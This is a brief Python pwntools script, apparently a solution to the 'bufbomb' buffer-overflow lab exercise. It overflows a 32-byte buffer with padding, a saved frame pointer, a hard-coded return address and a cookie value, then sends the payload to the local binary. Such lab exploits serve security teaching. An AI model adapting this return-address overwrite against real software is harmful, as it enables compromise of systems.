from pwn import *

f = open("./ID", "r")
id = f.read().splitlines()[0]
f.close()

sh = process(['./bufbomb', '-u', id])

length = 32
ret = 0x08048cc0
cookie = 0x274adc8a
ebp = 0x556834a0

exploit = flat(['a' * (length + 8), ebp, ret, cookie])

print ' '.join(char.encode("hex") for char in exploit)

sh.sendline(exploit)

sh.interactive()
